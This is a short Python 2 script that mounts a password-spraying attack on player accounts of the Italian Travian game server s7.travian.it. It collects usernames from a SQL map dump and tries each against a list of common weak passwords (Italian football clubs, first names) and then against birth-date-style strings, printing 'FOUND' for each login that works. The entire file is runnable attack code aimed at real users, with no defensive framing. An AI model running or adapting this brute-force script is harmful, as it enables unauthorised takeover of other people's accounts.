#!/usr/bin/env python
import time,sys,os,random
from travian_login import loginpw 

 

def test_server(server,password, s):
    for sfx in s:
        if ( loginpw(server,sfx, password) == 1):
            
            print "FOUND : ", sfx 
        else:
            pass
                
        time.sleep(0.01)
    

filemap=open(os.path.join("sql","it7.sql"),'r')
lista_map=filemap.readlines()  
s = set()
for lmap in lista_map:
    wsplit = lmap.split("(")
    cols= wsplit[1]
   
    colist = cols.split(",")
    if (len(colist)) > 7:
        
        s.add(colist[7])
    


passes = set(["abc","123","1111","123456","qwerty","password","juve","milan","inter","napoli","roma","lazio","juventus","fiorentina","cagliari","palermo","torino","francesco","luca","matteo","alessandro","lorenzo","antonio","giuseppe","tommaso","andrea","marco","giovanni","roberto","paolo","bruno","luigi","mario"])
for passe in passes:
    print passe
    test_server("s7.travian.it",passe , s)

for i in range(1, 31):
    if (i > 10):
        iss = str(i)
    else:
        iss = "0"+str(i)
    for j in range(1,12):
        for k in range(80,99):
            if (j > 10):
                js = str(j)
            else:
                js = "0"+str(j)
            teststr = iss +js+str(k)
            print teststr
            test_server("s7.travian.it",teststr, s)
            

          